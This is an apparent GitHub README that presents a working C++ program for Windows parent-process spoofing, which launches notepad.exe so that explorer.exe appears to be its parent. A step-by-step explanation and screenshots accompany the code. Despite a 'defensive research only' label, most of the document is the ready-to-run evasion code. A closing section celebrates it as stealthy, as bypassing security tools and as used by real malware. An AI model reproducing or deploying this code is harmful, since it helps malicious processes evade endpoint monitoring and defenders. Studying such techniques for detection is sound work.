# 🚨 Process Spoofing 

---

<p align="center">
  <img 
src="https://img.shields.io/badge/Project-Process%20Spoofing-blue?style=for-the-badge&logo=windows" 
alt="banner" />
</p>

<p align="center">
  <img 
src="https://raw.githubusercontent.com/<your-user>/<your-repo>/main/assets/hero.gif" 
alt="Process Spoofing Demo GIF" width="700"/>
</p>

>  Process Spoofing — learning & defensive research only. 
🚧

---

## 🚀 TL;DR
This section demonstrates **process spoofing / parent process spoofing** on Windows. It creates a process (`notepad.exe`) and makes it look like a trusted process (e.g., `explorer.exe`) started it. This is a demo for **learning** and **defensive research** — do **not** use on systems you don't own or have permission to test. ⚖️❗

---

## ❓ What is process spoofing? 

Process spoofing is when a program fakes the parent process for a newly created process. For example, making notepad.exe look like it was launched by explorer.exe. Simple monitoring rules sometimes trust processes started by explorer.exe, so spoofing can hide suspicious activity.

Imagine putting a trusted logo on a package to make it look safe — the package might still be dangerous under the label. 🎭📦


---


## 🎭 Process Spoofing Code.

---

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>

// 🔍 Function to find a process ID by its name (like "explorer.exe")
DWORD GetPidByName(const wchar_t* pName) {
    PROCESSENTRY32 pEntry;           // 📋 Structure to store process info
    HANDLE snapshot;                 // 📸 Handle for process snapshot

    pEntry.dwSize = sizeof(PROCESSENTRY32);  // 📏 Set structure size

    // 📸 Take a snapshot of all running processes
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    // 🔍 Start iterating through processes
    if (Process32First(snapshot, &pEntry) == TRUE) {
        while (Process32Next(snapshot, &pEntry) == TRUE) {
            // 🎯 Compare process names to find our target
            if (wcscmp(pEntry.szExeFile, pName) == 0) {
                return pEntry.th32ProcessID;  // ✅ Return PID if found
            }
        }
    }
}

int main(void) {
    // 🎪 Setup for advanced process creation
    STARTUPINFOEX info = { sizeof(0) };       // 📋 Extended startup info
    PROCESS_INFORMATION processInfo;          // 📊 Will store new process info

    // 🧰 Attribute list for process spoofing
    SIZE_T cbAttributeListSize = 0;           // 📏 Size of attribute list
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;  // 🎭 Our spoofing tool
    HANDLE hExploreProcess = NULL;            // ✋ Handle to explorer process
    DWORD dwExplorerPid = 0;                  // 🔢 Explorer's process ID

    // 🔍 Find Windows Explorer's process ID
    dwExplorerPid = GetPidByName(L"explorer.exe");

    // 🆘 Fallback: Use current process if explorer not found
    if (dwExplorerPid == 0) {
        dwExplorerPid = GetCurrentProcessId();
    }

    // 🛠️ Initialize process attribute list (magic spoofing toolkit)
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
    InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

    // ✋ Get a handle to the explorer process
    hExploreProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwExplorerPid);
    
    // 🎭 THE MAGIC TRICK: Tell Windows "Explorer is my parent!"
    UpdateProcThreadAttribute(pAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,  // 👶 "This is my parent process!"
        &hExploreProcess,                       // 🎯 Pointer to explorer handle
        sizeof(HANDLE),                         // 📏 Size of the handle
        NULL,                                   // 🚫 No extra parameters
        NULL);                                  // 🚫 No size needed

    // 📋 Attach our spoofed attributes to the startup info
    info.lpAttributeList = pAttributeList;

    // 🚀 CREATE THE SPOOFED PROCESS!
    CreateProcessA(
        NULL,                                   // 🚫 No application name
        (LPSTR)"notepad.exe",                   // 🎨 Launching Notepad as disguise
        NULL,                                   // 🚫 Default process security
        NULL,                                   // 🚫 Default thread security
        FALSE,                                  // ❌ Don't inherit handles
        EXTENDED_STARTUPINFO_PRESENT,           // ✅ Use our extended info (with spoofing!)
        NULL,                                   // 🚫 Use parent's environment
        NULL,                                   // 🚫 Use parent's directory
        (LPSTARTUPINFOA)&info.StartupInfo,      // 📋 Our spoofed startup info
        &processInfo);                          // 📊 Gets info about created process

    // 📊 Print the process IDs for demonstration
    printf("Malware PID: %d \n", GetCurrentProcessId());    // 👤 Original process
    printf("Explorer PID: %d \n", dwExplorerPid);           // 🎭 Spoofed parent
    printf("Notepad PID: %d \n", processInfo.dwProcessId);  // 🎨 New disguised process

    // ⏰ Wait 30 seconds to keep process visible
    Sleep(30000);

    // 🧹 Cleanup: Free resources
    DeleteProcThreadAttributeList(pAttributeList);  // 🗑️ Remove attribute list
    CloseHandle(hExploreProcess);                   // ✋ Close explorer handle
}
```

---

## 🎯 What This Code Actually Does:
Step 1: 🕵️‍♂️ Find Explorer.exe

  - Scans all running processes to find Windows Explorer

  - Gets its Process ID (PID) to use as a "disguise"

Step 2: 🎭 Prepare the Spoofing Toolkit

  - Creates a special attribute list that can trick Windows

  - Sets up the infrastructure for process identity theft

Step 3: 👶 The Magic Parent Trick

  - Uses UpdateProcThreadAttribute to claim: "Hey Windows, Explorer is my parent!"

  - This is the core spoofing technique that makes antivirus tools confused


Step 4: 🎪 Launch the Disguised Process

  - Creates Notepad.exe, but with a fake identity

  - To security tools, it looks like Explorer.exe launched Notepad naturally

Step 5: 📊 Show the Evidence

  - Prints all the Process IDs to prove the spoofing worked

  - Shows the original program, the spoofed parent, and the new disguised process


---

<img width="1078" height="599" alt="Screenshot 2025-09-20 at 11 29 30 PM" src="https://github.com/user-attachments/assets/941c329c-55af-40e3-9333-a5d85d529c16" />

---

<img width="1162" height="736" alt="Screenshot 2025-09-20 at 11 39 51 PM" src="https://github.com/user-attachments/assets/5fc31dcc-99ce-46a6-93d1-a1fe1c628700" />

---

<img width="1164" height="697" alt="Screenshot 2025-09-20 at 11 41 17 PM" src="https://github.com/user-attachments/assets/eb445fa0-98a8-4922-968b-e3bc0890f90a" />

---


## 🔥 Why This is So Cool:

   - Stealthy: Makes malicious processes look legitimate 🕶️
   - Bypasses Security: Many tools trust processes with "good parents" 🛡️
  - Professional Technique: Used by real malware and red teams 🎯
   - Windows API Magic: Uses official Microsoft features in creative ways 🧙‍♂️


---


